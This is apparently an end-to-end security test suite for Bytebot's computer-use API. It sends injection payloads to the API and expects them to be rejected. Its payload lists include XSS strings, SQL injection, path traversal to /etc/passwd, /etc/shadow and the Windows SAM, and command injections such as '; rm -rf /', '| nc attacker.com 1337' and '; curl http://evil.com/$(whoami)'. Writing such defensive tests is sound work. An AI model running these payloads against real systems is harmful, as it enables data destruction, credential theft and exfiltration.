/**
 * Enterprise Security Validation E2E Tests
 *
 * Comprehensive penetration testing suite for Bytebot security controls
 * including XSS, SQL injection, CORS, rate limiting, and input validation.
 *
 * @fileoverview End-to-end security testing and penetration test scenarios
 * @version 1.0.0
 * @author Input Validation & API Security Specialist
 */

import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../../src/app.module';

describe('Security Validation E2E Tests', () => {
  let app: INestApplication;
  let server: any;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    await app.init();
    server = app.getHttpServer();
  });

  afterAll(async () => {
    await app.close();
  });

  describe('CORS Security Tests', () => {
    it('should block requests from unauthorized origins', async () => {
      const response = await request(server)
        .post('/computer-use')
        .set('Origin', 'https://malicious.com')
        .send({ action: 'screenshot' })
        .expect(200); // Note: CORS is enforced by browser, not server blocking

      // Check if CORS headers are present
      expect(response.headers['access-control-allow-origin']).toBeUndefined();
    });

    it('should allow requests from authorized origins', async () => {
      const response = await request(server)
        .post('/computer-use')
        .set('Origin', 'http://localhost:3000')
        .send({ action: 'screenshot' });

      expect(response.headers['access-control-allow-origin']).toBeDefined();
    });

    it('should include security headers in response', async () => {
      const response = await request(server).get('/health').expect(200);

      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['strict-transport-security']).toBeDefined();
    });
  });

  describe('XSS Protection Tests', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '"><script>alert("XSS")</script>',
      '\'-alert("XSS")-\'',
      '<body onload=alert("XSS")>',
    ];

    xssPayloads.forEach((payload, index) => {
      it(`should block XSS payload #${index + 1}: ${payload.substring(0, 30)}...`, async () => {
        const response = await request(server)
          .post('/computer-use')
          .send({
            action: 'type_text',
            text: payload,
          })
          .expect(400);

        expect(response.body.message).toContain('security');
      });
    });

    it('should sanitize text inputs with HTML content', async () => {
      const response = await request(server).post('/computer-use').send({
        action: 'type_text',
        text: '<b>Bold text</b> with HTML',
      });

      // Should either block or sanitize
      if (response.status === 400) {
        expect(response.body.message).toContain('security');
      } else {
        // If allowed, should be sanitized
        expect(response.body).toBeDefined();
      }
    });
  });

  describe('SQL Injection Protection Tests', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1' OR 1=1 UNION SELECT username, password FROM users --",
      "admin'--",
      "' OR 1=1#",
      "1; EXEC xp_cmdshell('dir') --",
      "'; WAITFOR DELAY '00:00:05' --",
    ];

    sqlInjectionPayloads.forEach((payload, index) => {
      it(`should block SQL injection payload #${index + 1}`, async () => {
        const response = await request(server)
          .post('/computer-use')
          .send({
            action: 'write_file',
            path: `/tmp/test${payload}.txt`,
            data: btoa('test content'),
          })
          .expect(400);

        expect(response.body.message).toContain('security');
      });
    });
  });

  describe('Command Injection Protection Tests', () => {
    const commandInjectionPayloads = [
      '; ls',
      '| whoami',
      '`id`',
      '$(whoami)',
      '&& cat /etc/passwd',
      '; rm -rf /',
      '| nc attacker.com 1337',
      '; curl http://evil.com/$(whoami)',
    ];

    commandInjectionPayloads.forEach((payload, index) => {
      it(`should block command injection payload #${index + 1}`, async () => {
        const response = await request(server)
          .post('/computer-use')
          .send({
            action: 'application',
            application: `calculator${payload}`,
          })
          .expect(400);

        expect(response.body.message).toContain('security');
      });
    });
  });

  describe('Path Traversal Protection Tests', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      '../../../../../../../../../../../etc/passwd',
      '../../../../../../../../../../etc/shadow',
    ];

    pathTraversalPayloads.forEach((payload, index) => {
      it(`should block path traversal payload #${index + 1}`, async () => {
        const response = await request(server)
          .post('/computer-use')
          .send({
            action: 'read_file',
            path: payload,
          })
          .expect(400);

        expect(response.body.message).toContain('security');
      });
    });
  });

  describe('Rate Limiting Tests', () => {
    it('should enforce rate limits on rapid requests', async () => {
      const promises = [];

      // Send 150 rapid requests (exceeding the 100/minute limit)
      for (let i = 0; i < 150; i++) {
        promises.push(
          request(server).post('/computer-use').send({ action: 'screenshot' }),
        );
      }

      const responses = await Promise.all(promises);

      // Check that some requests were rate limited
      const rateLimitedResponses = responses.filter((r) => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);

      // Check rate limit response format
      const rateLimitResponse = rateLimitedResponses[0];
      expect(rateLimitResponse.body.error).toBe('Too Many Requests');
      expect(rateLimitResponse.body.message).toContain('rate limit');
    });

    it('should include rate limit headers', async () => {
      const response = await request(server)
        .post('/computer-use')
        .send({ action: 'screenshot' });

      expect(response.headers['x-request-id']).toBeDefined();
    });
  });

  describe('Input Validation Tests', () => {
    it('should reject invalid action types', async () => {
      const response = await request(server)
        .post('/computer-use')
        .send({
          action: 'malicious_action',
          data: 'test',
        })
        .expect(400);

      expect(response.body.message).toBeDefined();
    });

    it('should validate required fields', async () => {
      const response = await request(server)
        .post('/computer-use')
        .send({
          action: 'click_mouse',
          // Missing required coordinates
        })
        .expect(400);

      expect(response.body.message).toBeDefined();
    });

    it('should validate coordinate ranges', async () => {
      const response = await request(server)
        .post('/computer-use')
        .send({
          action: 'click_mouse',
          coordinates: { x: -1, y: -1 }, // Invalid negative coordinates
          button: 'left',
          clickCount: 1,
        })
        .expect(400);

      expect(response.body.errors).toBeDefined();
    });

    it('should limit payload size', async () => {
      const largeData = 'A'.repeat(51 * 1024 * 1024); // 51MB (exceeds 50MB limit)

      const response = await request(server)
        .post('/computer-use')
        .send({
          action: 'type_text',
          text: largeData,
        })
        .expect(413); // Payload Too Large

      expect(response.body.message).toContain('too large');
    });
  });

  describe('Error Handling Security Tests', () => {
    it('should not leak sensitive information in error responses', async () => {
      const response = await request(server)
        .post('/computer-use')
        .send({
          action: 'invalid_action',
        })
        .expect(400);

      // Should not contain file paths, stack traces, or system info
      const bodyStr = JSON.stringify(response.body);
      expect(bodyStr).not.toMatch(/\/[a-zA-Z0-9\/_\-\.]+/); // File paths
      expect(bodyStr).not.toMatch(/at [a-zA-Z0-9\._]+\(/); // Stack traces
      expect(bodyStr).not.toMatch(/NODE_ENV|API_KEY|SECRET|PASSWORD/i); // Env vars
    });

    it('should include request ID for tracking', async () => {
      const response = await request(server)
        .post('/computer-use')
        .send({
          action: 'invalid_action',
        })
        .expect(400);

      expect(
        response.body.requestId || response.headers['x-request-id'],
      ).toBeDefined();
    });

    it('should not expose system information in production mode', async () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      const response = await request(server)
        .post('/computer-use')
        .send({
          action: 'invalid_action',
        })
        .expect(400);

      expect(response.body.stack).toBeUndefined();
      expect(response.body.details).toBeUndefined();

      process.env.NODE_ENV = originalEnv;
    });
  });

  describe('Security Headers Tests', () => {
    it('should include comprehensive security headers', async () => {
      const response = await request(server).get('/health');

      const expectedHeaders = [
        'x-frame-options',
        'x-content-type-options',
        'strict-transport-security',
        'referrer-policy',
        'x-xss-protection',
      ];

      expectedHeaders.forEach((header) => {
        expect(response.headers[header]).toBeDefined();
      });
    });

    it('should set CSP headers', async () => {
      const response = await request(server).get('/health');

      expect(response.headers['content-security-policy']).toBeDefined();
    });
  });

  describe('Authentication & Authorization Tests', () => {
    it('should handle missing authentication gracefully', async () => {
      // Note: If authentication is implemented, this would test it
      const response = await request(server)
        .post('/computer-use')
        .send({ action: 'screenshot' });

      // Should either work (if no auth required) or return 401
      expect([200, 201, 400, 401]).toContain(response.status);
    });
  });

  describe('Fuzzing Tests', () => {
    const fuzzingPayloads = [
      // Null bytes
      'test\x00malicious',
      // Unicode bypasses
      'test\u0000malicious',
      // Binary data
      Buffer.from('test binary data').toString('base64'),
      // Extremely long strings
      'A'.repeat(10000),
      // Special characters
      '!@#$%^&*()[]{}|\\:";\'<>?,./`~',
      // JSON bomb (deeply nested)
      JSON.stringify({ a: { b: { c: { d: { e: { f: { g: 'deep' } } } } } } }),
    ];

    fuzzingPayloads.forEach((payload, index) => {
      it(`should handle fuzzing payload #${index + 1} gracefully`, async () => {
        const response = await request(server).post('/computer-use').send({
          action: 'type_text',
          text: payload,
        });

        // Should either process successfully or return appropriate error
        expect(response.status).toBeLessThan(500); // No server errors

        if (response.status >= 400) {
          expect(response.body.message).toBeDefined();
        }
      });
    });
  });

  describe('Performance Security Tests', () => {
    it('should complete requests within reasonable time', async () => {
      const startTime = Date.now();

      const response = await request(server)
        .post('/computer-use')
        .send({ action: 'screenshot' });

      const duration = Date.now() - startTime;

      // Should complete within 30 seconds (prevent DoS via slow responses)
      expect(duration).toBeLessThan(30000);
    });

    it('should handle concurrent requests efficiently', async () => {
      const concurrentRequests = 20;
      const promises = [];

      for (let i = 0; i < concurrentRequests; i++) {
        promises.push(
          request(server).post('/computer-use').send({ action: 'screenshot' }),
        );
      }

      const startTime = Date.now();
      const responses = await Promise.all(promises);
      const duration = Date.now() - startTime;

      // All requests should complete within reasonable time
      expect(duration).toBeLessThan(60000); // 60 seconds for all

      // Check that all requests were processed (not dropped)
      responses.forEach((response) => {
        expect(response.status).toBeLessThan(500);
      });
    });
  });

  describe('Security Monitoring Tests', () => {
    it('should log security events', async () => {
      // Trigger a security violation
      await request(server)
        .post('/computer-use')
        .send({
          action: 'type_text',
          text: '<script>alert("XSS")</script>',
        })
        .expect(400);

      // In a real implementation, you would check logs here
      // For now, we just verify the request was blocked
    });

    it('should include correlation IDs', async () => {
      const response = await request(server)
        .post('/computer-use')
        .send({ action: 'screenshot' });

      expect(
        response.headers['x-request-id'] ||
          response.headers['x-correlation-id'] ||
          response.body.operationId,
      ).toBeDefined();
    });
  });
});

describe('Security Configuration Tests', () => {
  it('should have secure default configurations', () => {
    // Test that security is enabled by default
    expect(process.env.NODE_ENV).toBeTruthy();

    // These would test actual configuration in a real scenario
    expect(true).toBe(true); // Placeholder
  });
});

export default {};
